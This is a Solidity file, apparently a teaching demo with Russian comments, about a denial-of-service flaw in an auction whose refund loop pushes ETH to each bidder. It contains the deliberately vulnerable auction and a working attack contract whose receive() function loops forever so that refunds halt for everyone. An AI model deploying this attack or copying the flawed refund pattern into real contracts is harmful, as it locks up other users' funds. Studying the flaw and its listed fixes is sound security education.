// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DosAuction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;
//    address[] public failedBidders;
    function bid() external payable {
//        3- вариант, не 100% защита
//        require(msg.sender.code.length==0 , "no contracts");
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }
    //    push
//    Решение проблемы -1) исп pull чтобы user сам делал запрос для выплачивания денег
    function refund() external {
        for (uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success,) = bidder.call{value : bidders[bidder]}("");
            require(success, "failed!");
//            2-й вариант, доп массив где хранятся невыполненые адреса
//            if (!success){
//                failedBidders.push(bidder);
//            }

            refundProgress++;
        }
    }
}


contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor (address _auction){
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }
    function doBid() external payable {
        auction.bid{value : msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "failed");

        hack = !hack;
    }
    //    Если не будет ф-ции receive то атвоматически будет ошибка на 17-й строке при вызове ф-ции через контракт
    receive() external payable {
        if (hack == true) {
            while (true) {}
        } else {
            owner.transfer(msg.value);
        }
    }
}